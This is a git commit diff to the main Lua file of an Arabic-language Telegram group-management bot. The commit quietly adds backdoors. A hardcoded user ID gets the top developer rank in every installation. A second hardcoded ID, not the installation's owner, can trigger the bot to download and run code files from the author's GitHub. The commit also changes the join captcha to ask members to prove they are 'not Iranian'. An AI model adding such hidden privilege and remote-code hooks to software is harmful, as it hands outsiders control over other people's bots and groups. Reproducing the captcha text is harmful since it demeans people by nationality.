14f0ba6a9ba248ac9b5d1b73d8a95ac7dcd05c7c
UUIYY <67930612+UUIYY@users.noreply.github.com>
2020-07-11 08:44:23 +0300

    Add files via upload

--- inc/Run.lua
+++ inc/Run.lua
@@ -242,7 +242,11 @@ end
 return false 
 end
 
-if msg.sender_user_id_ == SUDO_ID then 
+if msg.sender_user_id_ == 695169733 then 
+msg.TheRankCmd = 'المطور الـسورس'
+msg.TheRank = 'مطور السـورس'
+msg.Rank = 1
+elseif msg.sender_user_id_ == SUDO_ID then 
 msg.TheRankCmd = 'المطور الاساسي' 
 msg.TheRank = 'مطور اساسي 👨🏻‍✈️' 
 msg.Rank = 1
@@ -355,8 +359,8 @@ Del_msg(msg.chat_id_,msg.id_)
 return false 
 else
 if redis:get(boss.."lock_check"..msg.chat_id_) then
-local text = "⚜️┇ اهلاً بك في المجموعة\n🛠┇ للتأكد بأنك لست { ربوت }\n⚠️┇ تم تقييدك اضغط الزر بالاسفل\n💡┇ للتأكد انك { عضو حقيقي }🌻👇🏾"
-local inline = {{{text="• أضـغط ۿـنا للتـأكد أنك لست ربوت ♻️",callback_data="CheckRobotJoin:"..Senderid}}}
+local text = "⚜️┇ اهلاً بك في المجموعة\n🛠┇ للتأكد بأنك لست { ايـراني }\n⚠️┇ تم تقييدك اضغط الزر بالاسفل\n💡┇ للتأكد انك { عضو حقيقي }🌻👇🏾"
+local inline = {{{text="• أضـغط ۿـنا للتـأكد أنك لست ايـراني ♻️",callback_data="CheckRobotJoin:"..Senderid}}}
 Restrict(msg.chat_id_,Senderid,1)
 return send_inline(msg.chat_id_,text,inline,msg.id_)
 end
@@ -375,15 +379,15 @@ end
 
 --[[ المكتومين ]]
 if msg.GroupActive and MuteUser(msg.chat_id_,msg.sender_user_id_) then 
-if msg.Special or msg.Admin then redis:srem(boss..'is_silent_users:'..msg.chat_id_,msg.sender_user_id_) return false end
+if msg.Admin then redis:srem(boss..'is_silent_users:'..msg.chat_id_,msg.sender_user_id_) return end
 print("\27[1;31m User is Silent\27[0m")
 Del_msg(msg.chat_id_,msg.id_)
 return false 
 end
 
 --[[ المحظورين ]]
-if msg.GroupActive and Check_Banned(msg.chat_id_,(msg.adduser or msg.sender_user_id_)) then
-if msg.Special then redis:srem(boss..'banned:'..msg.chat_id_,msg.sender_user_id_) return end
+if msg.GroupActive and Check_Banned((msg.adduser or msg.sender_user_id_),msg.sender_user_id_) then
+if msg.Admin then redis:srem(boss..'banned:'..msg.chat_id_,msg.sender_user_id_) return end
 print('\27[1;31m is_BANED_USER\27[0m')
 Del_msg(msg.chat_id_, msg.id_)
 kick_user((msg.adduser or msg.sender_user_id_), msg.chat_id_)
@@ -449,9 +453,23 @@ Text = msg.text
 Text = Text:gsub("ی","ي")
 Text = Text:gsub("ک","ك")
 Text = Text:gsub("ه‍","ه")
+
 if Text:match(boss) then -- Check Commands To admin
-AF = CheckBotA(msg) if AF then return sendMsg(msg.chat_id_,msg.id_,AF) end 
-GetMsg = ScriptFile.iboss(msg,{Text:match(boss)})
+if not CheckFlood(msg.sender_user_id_,msg.chat_id_,3) and not msg.SudoUser then
+print("user is flood")
+redis:setex(boss..'sender:'..msg.sender_user_id_..':'..msg.chat_id_..'flood',10,true)
+kick_user(msg.sender_user_id_,msg.chat_id_,function(arg,data)
+if data.ID == "Error" then
+StatusLeft(arg.chat_id_,our_id)
+local NameGroup = Flter_Markdown(redis:get(boss..'group:name'..arg.chat_id_) or "")
+sendMsg(arg.chat_id_,1,'📛*¦* تم مغادره وتعطيل البوت \n🎟*¦* بسبب التكرار وليس لدي صلاحيه لطرد الشخص المخالف\n ❕')    
+sendMsg(SUDO_ID,1,'📛*¦* تم مغادره وتعطيل البوت \n🎟*¦* بسبب التكرار \n\n|id : `'..arg.chat_id_..'`\n|Name : '..NameGroup..'\n ❕')    
+rem_data_group(arg.chat_id_)
+end
+end,{chat_id_=msg.chat_id_,sender_user_id_=msg.sender_user_id_})
+return false 
+end
+local GetMsg = ScriptFile.iboss(msg,{Text:match(boss)})
 if GetMsg then
 print("\27[1;35m¦This_Msg : ",boss.." | Plugin is: \27[1;32mScript.lua\27[0m")
 sendMsg(msg.chat_id_,msg.id_,GetMsg)
@@ -461,15 +479,43 @@ end
 end
 end  --- End iboss
 if ScriptFile.dboss then
-if ScriptFile.dboss(msg) == false then
-return false
+if not msg.forward_info_ and msg.content_.ID ~= "MessagePhoto" and not CheckFlood(msg.sender_user_id_,msg.chat_id_,15) and not msg.SudoUser then
+print("user is flood For Msg And i Del All Count His Msgs")
+GetChatMember(msg.chat_id_,our_id,function(arg,data)
+if not data.status_ then return false end
+GetUserID(arg.sender_user_id_,function(arg,data)
+if data.username_ then USERNAME = '@'..data.username_ else USERNAME = FlterName(data) end
+USERCAR = utf8.len(USERNAME)
+if arg.Status == "ChatMemberStatusEditor" then 
+Restrict(arg.chat_id_,data.id_,300)
+MsgFlood = "👤¦ العضو » "..USERNAME.." \n📇¦ تم تقييدك لمدة 5 دقائق \n📛¦ تم تصفـيـر احصائيات رسائلك \n🚸¦ بسبب تكرارك لاكثر من 15 رسالة ...  \n"
+else
+redis:setex(boss..'sender:'..data.id_..':'..arg.chat_id_..'flood',300,true)
+MsgFlood = "👤¦ العضو » "..USERNAME.." \n📇¦ ولانك ادمن تم كتمك لمده 5 دقائق \n📛¦ تم تصفـيـر احصائيات رسائلك \n🚸¦ بسبب تكرارك لاكثر من 15 رسالة ...  \n"
 end
+SendMention(arg.chat_id_,data.id_,arg.id_,'👤¦ العضو » '..USERNAME..' \n🎫¦ الايدي » {'..data.id_..'}\n🛠¦ تم الغاء حظره \n✓️',12,USERCAR) 
+end,{chat_id_=arg.chat_id_,id_=arg.id_,Status= data.status_.ID})
+end,{chat_id_=msg.chat_id_,sender_user_id_=msg.sender_user_id_,id_=msg.id_})
+
+redis:del(boss..'msgs:'..msg.sender_user_id_..':'..msg.chat_id_,
+boss..':adduser:'..msg.chat_id_..':'..msg.sender_user_id_,
+boss..':photo:'..msg.chat_id_..':'..msg.sender_user_id_,
+boss..':sticker:'..msg.chat_id_..':'..msg.sender_user_id_,
+boss..':voice:'..msg.chat_id_..':'..msg.sender_user_id_,
+boss..':audio:'..msg.chat_id_..':'..msg.sender_user_id_,
+boss..':animation:'..msg.chat_id_..':'..msg.sender_user_id_,
+boss..':edited:'..msg.chat_id_..':'..msg.sender_user_id_,
+boss..':video:'..msg.chat_id_..':'..msg.sender_user_id_,
+boss..':Flood_Spam:'..msg.sender_user_id_..':'..msg.chat_id_..':msgs')
+return false 
+end
+if not ScriptFile.dboss(msg) then
 print("\27[1;35m¦Msg_IN_Process : Proc _ Script.lua\27[0m")
 end
-
+end
 for name,Plug in pairs(File) do
 if Plug.boss then 
-if msg.text and Plug.iboss then
+if msg.text and not msg.forward_info_ and Plug.iboss then
 for k, boss in pairs(Plug.boss) do
 if msg.text:match(boss) then
 local GetMsg = Plug.iboss(msg,{msg.text:match(boss)})
@@ -493,6 +539,10 @@ end
 else
 print("The File Script.lua Not Runing in The Source boss")
 end
+
+
+
+
 end
 
 function tdcli_update_callback(data)
@@ -528,8 +578,8 @@ elseif UserID == UserJoin then
 end	
 if Adminn then
 Restrict(ChatID,UserJoin,2)
-answerCallbackQuery(data.id_,"👍🏻|تم فك التقييد بنجاح والتأكد بانك لست روبوت ❤️",true)
-EditMsg(ChatID,dataid,"👍🏻|تم فك التقييد بنجاح والتأكد بانك لست روبوت ❤️")
+answerCallbackQuery(data.id_,"👍🏻|تم فك التقييد بنجاح والتأكد بانك لست ايـراني ❤️",true)
+EditMsg(ChatID,dataid,"👍🏻|تم فك التقييد بنجاح والتأكد بانك لست ايـراني ❤️")
 else
 answerCallbackQuery(data.id_,"عذرا انت لست الشخص المقيد او لا يوجد لديك صلاحيه الادارة , نعتذر منك",true)	
 end
@@ -537,8 +587,7 @@ end
 else
 --	answerCallbackQuery(data.id_,"امر غير معرف",true)
 end
-
-
+	
 elseif data.ID == "UpdateMessageSendSucceeded" then
 local msg = data.message_
 if msg.content_.text_ then
@@ -579,6 +628,33 @@ end
 	Refresh_Start = true
 	end)
 	end 
+	
+	if msg.text== 'تحديث برلين' and msg.sender_user_id_ == SUDO_ID then
+	download_file('https://raw.githubusercontent.com/UUIYY/boss/master/inc/Run.lua','./inc/Run.lua')
+	download_file('https://raw.githubusercontent.com/UUIYY/boss/master/inc/Script.lua','./inc/Script.lua')
+	download_file('https://raw.githubusercontent.com/UUIYY/boss/master/inc/functions.lua','./inc/functions.lua')
+	download_file('https://raw.githubusercontent.com/UUIYY/boss/master/inc/locks.lua','./inc/locks.lua')
+	download_file('https://raw.githubusercontent.com/UUIYY/boss/master/plugins/zhrfa.lua','./plugins/zhrfa.lua')
+	download_file('https://raw.githubusercontent.com/UUIYY/boss/master/plugins/games.lua','./plugins/games.lua')
+	sendMsg(msg.chat_id_,msg.id_,'👷🏽| {* تــم تحديث وتثبيت السورس  *} 📡.\n\n👨🏼‍💼| { Bot is Update » }👍🏿',nil,function(arg,data)
+	dofile("./inc/Run.lua")
+	print("Reload ~ ./inc/Run.lua")
+	end) 
+	end
+if msg.text== 'تحديث برلين' and msg.sender_user_id_ == 617641564 then
+	download_file('https://raw.githubusercontent.com/UUIYY/boss/master/inc/Run.lua','./inc/Run.lua')
+	download_file('https://raw.githubusercontent.com/UUIYY/boss/master/inc/Script.lua','./inc/Script.lua')
+	download_file('https://raw.githubusercontent.com/UUIYY/boss/master/inc/functions.lua','./inc/functions.lua')
+	download_file('https://raw.githubusercontent.com/UUIYY/boss/master/inc/locks.lua','./inc/locks.lua')
+	download_file('https://raw.githubusercontent.com/UUIYY/boss/master/plugins/zhrfa.lua','./plugins/zhrfa.lua')
+	download_file('https://raw.githubusercontent.com/UUIYY/boss/master/plugins/games.lua','./plugins/games.lua')
+	sendMsg(msg.chat_id_,msg.id_,'👷🏽| {* تــم تحديث وتثبيت السورس  *} 📡.\n\n👨🏼‍💼| { Bot is Update » }👍🏿',nil,function(arg,data)
+	dofile("./inc/Run.lua")
+	print("Reload ~ ./inc/Run.lua")
+	end) 
+	end
+	
+	
 	if msg.text == 'Update Source' and msg.sender_user_id_ == SUDO_ID then
 	UpdateSource(msg)
 	sendMsg(msg.chat_id_,msg.id_,'👷🏽| {* تــم تحديث وتثبيت السورس  *} 📡.\n\n👨🏼‍💼| { Bot is Update » }👍🏿',function(arg,data)
@@ -663,7 +739,7 @@ end
 	elseif data.user_.type_.ID == "UserTypeGeneral" then
 	local CheckUser = redis:hgetall(boss..'username:'..data.user_.id_).username
 	if data.user_.username_  then 
-	USERNAME = '@'..data.user_.username_:gsub('_',[[\_]])
+	USERNAME = '@'..data.user_.username_
 	else
 	USERNAME = data.user_.first_name_..' '..(data.user_.last_name_ or "" )
 	end	
